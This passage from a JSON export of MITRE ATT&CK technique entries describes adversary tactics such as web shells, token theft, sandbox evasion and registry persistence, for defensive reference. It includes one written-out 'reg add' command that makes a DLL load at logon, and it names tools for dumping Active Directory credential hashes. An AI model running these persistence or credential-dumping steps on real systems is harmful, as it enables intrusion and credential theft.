go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.\", \"modified\": \"2020-10-16T18:09:49.074Z\", \"id\": \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\"}, \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:04.710Z\", \"name\": \"File and Directory Discovery\", \"attack_pattern_identifier\": \"T1083\", \"modified\": \"2020-09-16T16:02:16.770Z\", \"description\": \"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).\", \"id\": \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\"}, \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:16.408Z\", \"name\": \"Ingress Tool Transfer\", \"attack_pattern_identifier\": \"T1105\", \"modified\": \"2020-03-20T15:42:48.595Z\", \"description\": \"Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\", \"id\": \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\"}, \"attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-02-14T16:15:05.974Z\", \"name\": \"Domain Trust Discovery\", \"attack_pattern_identifier\": \"T1482\", \"description\": \"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)\", \"modified\": \"2020-09-17T18:26:17.858Z\", \"id\": \"attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0\"}, \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:23.587Z\", \"name\": \"Modify Registry\", \"attack_pattern_identifier\": \"T1112\", \"description\": \"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\\n\\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\\n\\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\\n\\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\", \"modified\": \"2020-08-13T20:02:49.641Z\", \"id\": \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\"}, \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2019-12-13T16:46:18.927Z\", \"name\": \"Web Shell\", \"attack_pattern_identifier\": \"T1505.003\", \"modified\": \"2020-09-16T19:34:19.752Z\", \"description\": \"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\\n\\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013) \", \"id\": \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\"}, \"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-18T16:39:06.289Z\", \"name\": \"Token Impersonation/Theft\", \"attack_pattern_identifier\": \"T1134.001\", \"modified\": \"2020-03-26T21:29:18.608Z\", \"description\": \"Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\\n\\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.\", \"id\": \"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\"}, \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:38.511Z\", \"name\": \"Masquerading\", \"attack_pattern_identifier\": \"T1036\", \"description\": \"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\\n\\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)\", \"modified\": \"2020-07-09T13:54:28.727Z\", \"id\": \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\"}, \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:06.988Z\", \"name\": \"Account Discovery\", \"attack_pattern_identifier\": \"T1087\", \"description\": \"Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.\", \"modified\": \"2020-09-16T15:10:18.260Z\", \"id\": \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\"}, \"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-04T12:47:23.631Z\", \"name\": \"Unsecured Credentials\", \"attack_pattern_identifier\": \"T1552\", \"description\": \"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).\", \"modified\": \"2020-10-15T19:39:36.109Z\", \"id\": \"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\"}, \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-04-17T22:22:24.505Z\", \"name\": \"Virtualization/Sandbox Evasion\", \"attack_pattern_identifier\": \"T1497\", \"modified\": \"2020-07-01T16:32:02.272Z\", \"description\": \"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\\n\\n\", \"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\"}, \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-16T15:48:33.882Z\", \"name\": \"Asymmetric Cryptography\", \"attack_pattern_identifier\": \"T1573.002\", \"modified\": \"2020-03-30T00:37:16.593Z\", \"description\": \"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\\n\\nFor efficiency, may protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).\", \"id\": \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\"}, \"attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:44.329Z\", \"name\": \"Windows Management Instrumentation\", \"attack_pattern_identifier\": \"T1047\", \"description\": \"Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\\n\\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)\", \"modified\": \"2020-05-13T22:50:51.258Z\", \"id\": \"attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055\"}, \"attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-10-01T01:30:00.877Z\", \"name\": \"Develop Capabilities\", \"attack_pattern_identifier\": \"T1587\", \"description\": \"Before compromising a victim, adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)\\n\\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.\", \"modified\": \"2020-10-22T18:18:08.552Z\", \"id\": \"attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf\"}, \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-14T18:18:32.443Z\", \"name\": \"Non-Standard Port\", \"attack_pattern_identifier\": \"T1571\", \"description\": \"Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\", \"modified\": \"2020-03-26T22:02:25.221Z\", \"id\": \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\"}, \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-05T14:54:07.588Z\", \"name\": \"Subvert Trust Controls\", \"attack_pattern_identifier\": \"T1553\", \"description\": \"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\\n\\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) \", \"modified\": \"2020-06-20T22:42:26.314Z\", \"id\": \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\"}, \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-26T17:41:25.933Z\", \"name\": \"Hide Artifacts\", \"attack_pattern_identifier\": \"T1564\", \"description\": \"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\\n\\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)\", \"modified\": \"2020-09-23T11:31:50.636Z\", \"id\": \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\"}, \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-10-01T01:56:24.776Z\", \"name\": \"Obtain Capabilities\", \"attack_pattern_identifier\": \"T1588\", \"description\": \"Before compromising a victim, adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\\n\\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)\\n\\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)\", \"modified\": \"2020-10-22T18:22:21.135Z\", \"id\": \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\"}, \"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:48.323Z\", \"name\": \"Input Capture\", \"attack_pattern_identifier\": \"T1056\", \"description\": \"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).\", \"modified\": \"2020-10-21T01:31:35.760Z\", \"id\": \"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\"}, \"attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:21.315Z\", \"name\": \"System Service Discovery\", \"attack_pattern_identifier\": \"T1007\", \"modified\": \"2020-03-15T01:05:08.805Z\", \"description\": \"Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \\\"sc,\\\" \\\"tasklist /svc\\\" using [Tasklist](https://attack.mitre.org/software/S0057), and \\\"net start\\\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"id\": \"attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa\"}, \"attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T21:07:55.393Z\", \"name\": \"Local Account\", \"attack_pattern_identifier\": \"T1087.001\", \"description\": \"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\\n\\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file.\", \"modified\": \"2020-03-20T19:39:59.544Z\", \"id\": \"attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e\"}, \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-06-28T17:52:07.296Z\", \"name\": \"Server Software Component\", \"attack_pattern_identifier\": \"T1505\", \"description\": \"Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\", \"modified\": \"2020-09-16T19:34:19.961Z\", \"id\": \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\"}, \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Signed Binary Proxy Execution\", \"attack_pattern_identifier\": \"T1218\", \"description\": \"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\", \"modified\": \"2020-10-21T18:37:15.275Z\", \"id\": \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\"}, \"attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:42:35.572Z\", \"name\": \"NTDS\", \"attack_pattern_identifier\": \"T1003.003\", \"modified\": \"2020-03-24T20:39:39.949Z\", \"description\": \"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\\\NTDS\\\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\\n\\nIn addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\\n\\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\\n\\n* Volume Shadow Copy\\n* secretsdump.py\\n* Using the in-built Windows tool, ntdsutil.exe\\n* Invoke-NinjaCopy\\n\", \"id\": \"attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24\"}, \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-22T21:04:23.285Z\", \"name\": \"Event Triggered Execution\", \"attack_pattern_identifier\": \"T1546\", \"description\": \"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. \\n\\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\\n\\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. \", \"modified\": \"2020-10-21T18:48:27.576Z\", \"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\"}, \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:27.342Z\", \"name\": \"System Network Configuration Discovery\", \"attack_pattern_identifier\": \"T1016\", \"description\": \"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\\n\\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"modified\": \"2020-03-15T00:55:33.136Z\", \"id\": \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\"}, \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:56.776Z\", \"name\": \"Application Layer Protocol\", \"attack_pattern_identifier\": \"T1071\", \"description\": \"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. \", \"modified\": \"2020-10-21T16:35:45.986Z\", \"id\": \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\"}, \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:10.728Z\", \"name\": \"Non-Application Layer Protocol\", \"attack_pattern_identifier\": \"T1095\", \"modified\": \"2020-10-21T19:41:49.412Z\", \"description\": \"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\\n\\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)\\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\", \"id\": \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\"}, \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-20T20:53:45.725Z\", \"name\": \"Archive Collected Data\", \"attack_pattern_identifier\": \"T1560\", \"description\": \"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\\n\\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.\", \"modified\": \"2020-10-21T16:36:55.831Z\", \"id\": \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\"}, \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:29.858Z\", \"name\": \"Remote Services\", \"attack_pattern_identifier\": \"T1021\", \"modified\": \"2020-03-25T12:25:03.251Z\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\\n\\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)\", \"id\": \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\"}, \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:35:36.479Z\", \"name\": \"File Deletion\", \"attack_pattern_identifier\": \"T1070.004\", \"description\": \"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\\n\\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)\", \"modified\": \"2020-03-29T21:34:16.209Z\", \"id\": \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\"}, \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-23T22:02:48.566Z\", \"name\": \"Registry Run Keys / Startup Folder\", \"attack_pattern_identifier\": \"T1547.001\", \"description\": \"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \\\"run keys\\\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\\n\\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\\\Users\\\\[Username]\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup</code>. The startup folder path for all users is <code>C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp</code>.\\n\\nThe following run keys are created by default on Windows systems:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n\\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \\\"Depend\\\" key with RunOnceEx: <code>reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\\"C:\\\\temp\\\\evil[.]dll\\\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\\n\\nThe following Registry keys can be used to set startup folder items for persistence:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n\\nThe following Registry keys can control automatic 